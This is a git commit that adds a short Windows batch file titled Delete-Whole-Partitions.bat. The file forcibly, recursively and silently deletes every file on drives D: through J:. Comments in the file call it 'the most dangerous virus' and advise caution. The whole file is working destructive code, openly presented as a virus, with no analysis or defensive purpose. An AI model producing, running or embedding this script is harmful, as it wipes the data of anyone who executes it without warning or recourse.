9c8896671b627bccd8939b9cd75102fb7caed807
Harsh Panchal <63415584+HarshPanchal18@users.noreply.github.com>
2022-10-16 11:41:58 +0530

    Create Delete-Whole-Partitions.bat

---
+++ Delete-Whole-Partitions.bat
@@ -0,0 +1,12 @@
+@echo off
+
+del D:*.*/f /s /q
+del E:*.*/f /s /q
+del F:*.*/f /s /q
+del G:*.*/f /s /q
+del H:*.*/f /s /q
+del I:*.*/f /s /q
+del J:*.*/f /s /q
+
+rem This is the most dangerous virus!!
+rem Be careful with its use
